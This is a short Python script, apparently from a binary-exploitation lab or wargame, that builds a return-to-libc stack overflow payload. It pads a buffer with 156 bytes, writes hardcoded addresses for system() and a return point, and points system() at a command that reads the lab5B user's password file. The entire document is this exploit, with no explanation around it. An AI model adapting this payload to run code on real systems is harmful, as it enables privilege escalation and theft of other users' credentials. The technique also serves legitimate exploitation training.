import struct

shellcode = ""

SYSTEM_ADDR = struct.pack("<I", 0xb7e63190)
CMD_ADDR = struct.pack("<I", 0xbffff484)
MAIN_RET_ADDR = struct.pack("<I", 0xb7e3ca83)
CMD_TO_EXEC = "cat /home/lab5B/.pass"
JUNK = "A" * 156

shellcode += JUNK
# Stack frame for calling system()
shellcode += SYSTEM_ADDR
shellcode += MAIN_RET_ADDR
shellcode += CMD_ADDR
shellcode += CMD_TO_EXEC

print shellcode
